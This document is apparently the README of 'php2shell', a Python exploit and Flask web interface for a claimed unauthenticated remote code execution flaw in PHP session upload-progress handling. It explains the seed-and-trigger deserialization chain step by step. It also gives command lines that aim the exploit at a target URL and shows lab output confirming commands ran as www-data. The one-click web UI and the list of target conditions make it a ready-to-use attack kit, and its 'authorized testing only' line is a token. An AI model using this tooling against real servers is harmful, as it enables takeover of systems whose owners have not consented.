# php2shell — web exploit

Python exploit + simple web app for **php2shell** (CVE-2026-109618 / CVE-2026-109619),
the critical unauthenticated RCE in PHP core's `session.upload_progress` handling.

- `exploit.py` — the exploit (stdlib only, CLI or importable library)
- `webapp.py` — Flask web app: enter a URL, pick a command, read the RCE output
- `templates/index.html` — the web UI

## The vulnerability (1 minute version)

PHP 5.4.0 – 8.5.11 stores upload-progress data in the session under a key whose name
includes an **unvalidated** `PHP_SESSION_UPLOAD_PROGRESS` value. The exploit chains:

1. **seed** — multipart POST to a page in a directory with
   `session.serialize_handler=php_serialize`:
   - `PHPSESSID=<sid>` in the body fixes the session id (bypasses `use_only_cookies`)
   - `PHP_SESSION_UPLOAD_PROGRESS=|<serialized-object>` makes the stored key
     `upload_progress_|<object>` — the object rides inside the session blob verbatim
2. **trigger** — GET a page that calls `session_start()` in a directory with the default
   `php` handler: it splits the blob at the first `|`, unserializes the object, and the
   trailing container data forces a decode failure — so the object's `__destruct()`
   runs *inside* `session_start()`, before the page body. The command output lands in
   the trigger response → RCE.

Affected: PHP 5.4.0 – 8.5.11. Fixed in 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12.
Mitigation: `session.upload_progress.enabled = Off`.

## Quick start (web app)

```bash
pip install flask            # or: pip install --break-system-packages flask
python3 webapp.py            # -> http://127.0.0.1:8899  (port arg optional)
```

Open `http://127.0.0.1:8899`, put a target URL in the input, click **EXPLOIT**.

## CLI

```bash
python3 exploit.py http://127.0.0.1:18081 --cmd "id; whoami; uname -a"
python3 exploit.py https://target.example.com --gadget Monolog --prop target
```

Options: `--cmd`, `--seed-path`, `--trigger-path`, `--gadget`, `--prop`, `--sid`, `--timeout`.

## Tested against the local lab

The vulnerable lab (nginx + php-fpm 8.2.34 from `CVE-2026-109618-exploit/`) is running
at `http://127.0.0.1:18081`:

```
$ python3 exploit.py http://127.0.0.1:18081 --cmd "id; whoami"
[1] seed   POST /app/seed.php -> HTTP 200 (15 B)
[2] fire   GET  /api/app.php -> HTTP 200 (255 B)
---- trigger response ----
[gadget] uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
[+] RCE CONFIRMED — command output seen
```

## Target requirements

| Condition | Why |
|---|---|
| `session.upload_progress.enabled=On` (default) | the injection channel |
| `session.upload_progress.cleanup=Off` | keeps the seeded payload on disk |
| write dir with `session.serialize_handler=php_serialize` + read dir with `php` (`.user.ini` / `.htaccess`), same `session.save_path` | the `\|` split + handler mismatch |
| a class with an exploitable `__destruct` loaded when `session_start()` runs (app code, `opcache.preload`, `auto_prepend_file`) | the RCE gadget (`--gadget` / `--prop`) |
| `session.use_strict_mode=0` (default) | attacker-chosen session id via POST body |

Authorized security testing only.
